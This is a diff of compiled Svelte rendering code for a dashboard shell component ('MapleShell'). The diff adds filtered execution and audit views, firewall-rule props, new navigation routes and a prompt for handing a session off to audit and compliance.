+    if (selectedExecutionId && !filteredExecutions.some((entry) => entry.executionId === selectedExecutionId)) {
+      selectedExecutionId = filteredExecutions[0]?.executionId ?? "";
+    }
+    activeExecution = filteredExecutions.find((entry) => entry.executionId === selectedExecutionId) ?? filteredExecutions[0] ?? null;
     if (!targetInput && state.executionId) targetInput = state.executionId;
     if (!targetInput && state.sessionId) targetInput = state.sessionId;
     if (!targetInput && activeExecution?.executionId) targetInput = activeExecution.executionId;
     topologyEndpoints = (() => {
       const seen = /* @__PURE__ */ new Set();
       const output = [];
-      for (const event of auditEvents) {
-        const host = String(event.url ?? event.domain ?? event.host ?? event.destination ?? event.target ?? "").trim();
-        const fallback2 = String(event.traceId ?? event.executionId ?? "").trim();
-        const key = host || (fallback2 ? `trace:${fallback2}` : "");
+      for (let index = 0; index < filteredAuditEvents.length; index += 1) {
+        const event = filteredAuditEvents[index];
+        const key = parseHostFromEvent(event, index);
         if (!key || seen.has(key)) continue;
         seen.add(key);
         output.push({
           host: key,
-          status: String(event.status ?? event.severity ?? "observed").toLowerCase()
+          status: String(event.status ?? event.severity ?? "observed").toLowerCase(),
+          sessionId: deriveSessionId(event, index)
         });
       }
       return output;
@@ -1048,9 +1536,9 @@ function MapleShell($$renderer, $$props) {
     `${store_get($$store_subs ??= {}, "$page", page).url.pathname}${store_get($$store_subs ??= {}, "$page", page).url.search}`;
     categoryHrefById = Object.fromEntries(MAPLE_WORKSPACE_CATEGORIES.map((category) => [
       category.id,
-      buildWorkspaceHref({
+      category.id === "docs" ? "/quickstart" : buildWorkspaceHref({
         category: category.id,
-        view: category.id === "docs" ? "overview" : category.id === "observe" ? "live" : category.id === "chat" ? "chat" : category.id === "analyze" ? "control" : "settings",
+        view: category.id === "observe" ? "topology" : category.id === "chat" ? "chat" : category.id === "admin" ? "control" : category.id === "firewalls" ? "cybersecurity" : category.id === "users" ? "access" : "overview",
         routePath: state.routePath,
         executionId: targetInput || (activeExecution?.executionId ?? ""),
         sessionId: activeExecution?.sessionId ?? ""
@@ -1067,7 +1555,7 @@ function MapleShell($$renderer, $$props) {
       })
     ]));
     $$renderer2.push(`<section class="workspace product-body" data-testid="maple-workspace-layout"><div class="product-shell shell" data-testid="maple-workspace-shell">`);
-    MapleTopBar($$renderer2, { connected: panelOpen });
+    MapleTopBar($$renderer2, { connected: panelOpen, analystOptions, selectedAnalysts });
     $$renderer2.push(`<!----> <div class="main-area"><div${attr_class("chat-home", void 0, { "panel-active": panelOpen })}><div${attr_class("welcome-state", void 0, { "is-hidden": state.category !== "chat" || hasPrompted })}><h2 class="welcome-heading">What can I help with?</h2> <p class="welcome-sub">Connected to Frontend B orchestration runtime stream.</p> <div class="welcome-pills"><!--[-->`);
     const each_array = ensure_array_like(quickPrompts);
     for (let $$index = 0, $$length = each_array.length; $$index < $$length; $$index++) {
@@ -1081,16 +1569,17 @@ function MapleShell($$renderer, $$props) {
       routeRecord: state.routeRecord,
       summary,
       slo,
-      auditEvents,
-      approvals,
+      auditEvents: filteredAuditEvents,
+      approvals: filteredApprovals,
       topologyEndpoints,
-      executions,
+      executions: filteredExecutions,
       runtimeCapabilities,
       integrationCatalog,
       connectedIntegrations,
       downstreamApps,
       downstreamTools,
       openclawCatalog,
+      firewallRules,
       authMe,
       selectedExecutionId,
       targetInput,
@@ -1102,6 +1591,7 @@ function MapleShell($$renderer, $$props) {
       error,
       showConfirmStop,
       allEndpoints,
+      queueInterventionHandoff,
       setTraceQuery: (value) => traceQuery = value,
       setSessionQuery: (value) => sessionQuery = value,
       selectExecution,
@@ -1109,6 +1599,7 @@ function MapleShell($$renderer, $$props) {
       setReason: (value) => reason = value,
       pauseExecution: (target) => runAction("pauseExecution", target),
       resumeExecution: (target) => runAction("resumeExecution", target),
+      blockActionRule,
       openStopConfirm: () => showConfirmStop = true,
       cancelStopConfirm: () => showConfirmStop = false,
       confirmStop: (target) => runAction("cancelExecution", target)
@@ -1127,13 +1618,27 @@ function MapleShell($$renderer, $$props) {
       hrefByCategory: categoryHrefById
     });
     $$renderer2.push(`<!----> `);
+    if (state.category !== "chat") {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<div class="chat-composer-placeholder" aria-hidden="true"></div>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--> `);
     if (state.category === "chat") {
       $$renderer2.push("<!--[0-->");
       $$renderer2.push(`<div class="chat-composer chat-composer-home"><div class="chat-input-wrap"><input${attr("value", chatInput)} placeholder="Ask Mayple to summarize runtime context..." aria-label="Mayple chat input"/> <button type="button" class="chat-send-btn" aria-label="Send">↑</button></div></div>`);
     } else {
       $$renderer2.push("<!--[-1-->");
     }
-    $$renderer2.push(`<!--]--></div></div></div></section>`);
+    $$renderer2.push(`<!--]--></div></div></div> `);
+    if (handoffPrompt) {
+      $$renderer2.push("<!--[0-->");
+      $$renderer2.push(`<div class="handoff-toast panel" role="dialog" aria-live="polite"><h4>Send to Audit &amp; Compliance?</h4> <p>Send session <strong>${escape_html(handoffPrompt.sessionId)}</strong> from ${escape_html(handoffPrompt.label)} to Intervention Command Bar?</p> <div class="actions"><button type="button" class="action-btn primary">Yes, send</button> <button type="button" class="action-btn">No</button></div></div>`);
+    } else {
+      $$renderer2.push("<!--[-1-->");
+    }
+    $$renderer2.push(`<!--]--></section>`);
     if ($$store_subs) unsubscribe_stores($$store_subs);
   });
 }
